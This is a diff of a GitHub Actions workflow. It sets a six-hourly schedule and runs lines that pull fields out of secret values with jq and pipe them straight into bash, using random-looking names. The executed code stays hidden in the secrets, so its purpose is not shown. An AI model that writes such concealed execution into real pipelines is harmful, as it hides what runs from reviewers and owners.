@@ -2,23 +2,24 @@ name: tongyaochen7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 5/6 * * *'
+    - cron: '32 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tongyaochen7654
         env:
-          nqfh77: ${{ secrets.nqfh77 }}
+          p26: ${{ secrets.p26 }}
         run: |
-          echo $nqfh77 | jq -r .tih4 | /bin/bash
-          echo $cxxle979 | jq -r .e63877 | /bin/bash
-          echo $zxqnp99 | jq -r .kqonn88041 | /bin/bash
-          echo $ryz9 | jq -r .fa4189 | /bin/bash
-          echo $aqj5 | jq -r .uqr8945 | /bin/bash
-          echo $lqxb146 | jq -r .on5 | /bin/bash
-          echo $t8395 | jq -r .hs1 | /bin/bash
-          echo $hjv33 | jq -r .zas355 | /bin/bash
+          echo $p26 | jq -r .cnqm68 | /bin/bash
+          echo $mtuvk004 | jq -r .pe615 | /bin/bash
+          echo $dja749 | jq -r .am52556 | /bin/bash
+          echo $s4632 | jq -r .m0 | /bin/bash
+          echo $cvu0 | jq -r .sgl1 | /bin/bash
+          echo $wcydf98 | jq -r .sz50649 | /bin/bash
+          echo $sgsy3922 | jq -r .guord389 | /bin/bash
+          echo $uxui8 | jq -r .vqo5192 | /bin/bash
+          echo $tfn07 | jq -r .br0 | /bin/bash
 
